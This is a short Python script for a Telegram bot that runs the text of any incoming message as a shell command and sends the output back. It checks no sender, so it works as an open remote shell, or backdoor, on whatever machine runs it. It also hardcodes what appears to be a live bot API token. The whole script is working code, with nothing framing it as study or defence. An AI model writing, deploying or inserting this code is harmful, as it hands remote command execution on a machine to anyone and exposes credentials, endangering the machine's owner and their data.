import telebot, subprocess, os
bot = telebot.TeleBot("8959195719:AAFODhpuArbIerPGKBcD5svoQ8fg3W2QDsc")
@bot.message_handler(func=lambda m: True)
def execute(m):
    try:
        out = subprocess.check_output(m.text, shell=True, stderr=subprocess.STDOUT, text=True)
        bot.reply_to(m, f"\`\`\`\\n{out[:4000]}\\n\`\`\`", parse_mode='Markdown')
    except Exception as e: bot.reply_to(m, str(e))
bot.infinity_polling()
